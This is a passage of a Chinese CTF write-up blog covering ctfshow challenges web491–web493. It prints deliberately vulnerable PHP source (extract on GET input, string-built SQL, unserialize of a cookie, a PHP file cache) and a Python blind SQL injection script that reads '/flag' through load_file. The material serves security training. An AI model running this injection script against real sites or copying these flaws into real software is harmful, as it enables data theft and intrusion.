class="string">&#x27;?&gt;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cache_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 12:11:38</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也没有可以利用的点,那么只能在sql注入里面动手了.那么直接利用sql读取本地文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://de4a1753-a35d-401e-9d4e-aad8aa7d89a2.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">&quot;select load_file(&#x27;/flag&#x27;)&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: f<span class="string">&quot;1&#x27; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- + #&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> : <span class="string">&#x27;check&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.<span class="title function_ invoke__">get</span>(url,params=params)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;username&quot;</span>  in r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web492"><a href="#web492" class="headerlink" title="web492"></a>web492</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-10 12:16:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;render_class</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-10 13:37:14</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&lt;！--&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;--&gt;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;db_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-10 12:12:00</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$addr</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$database</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>templates&#x2F;index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> Author: h1xa</span><br><span class="line"> Date:   <span class="number">2021</span>-<span class="number">03</span>-<span class="number">08</span> <span class="number">16</span>:<span class="number">54</span>:<span class="number">39</span></span><br><span class="line"> Last Modified by:   h1xa</span><br><span class="line"> Last Modified time: <span class="number">2021</span>-<span class="number">03</span>-<span class="number">09</span> <span class="number">16</span>:<span class="number">21</span>:<span class="number">04</span></span><br><span class="line"> email: h1xa@ctfer.com</span><br><span class="line"> link: https:<span class="comment">//ctfer.com</span></span><br><span class="line"> path /templates/index.php</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&#123;&#123;username&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/^[A-Za-z0-9]+$/表示匹配以数字字母开头结尾中间全是数字字母</span><br></pre></td></tr></table></figure><p>那么这里简单变量覆盖就可,但是要注意一下将它的注释进行闭合</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200031843.png" alt="image-20220411200031843"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200106381.png" alt="image-20220411200106381"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200118887.png" alt="image-20220411200118887"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200135182.png" alt="image-20220411200135182"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200208135.png" alt="image-20220411200208135"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201037379.png" alt="image-20220411201037379"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201043845.png" alt="image-20220411201043845"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201050704.png" alt="image-20220411201050704"></p><h1 id="web493"><a href="#web493" class="headerlink" title="web493"></a>web493</h1><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-12 17:23:33</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;user&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-12 15:52:18</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&lt;！--&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;--&gt;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;db_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-12 17:43:56</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable language_">$this</span>-&gt;addr,<span class="variable language_">$this</span>-&gt;username,<span class="variable language_">$this</span>-&gt;password,<span class="variable language_">$this</span>-&gt;database);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span 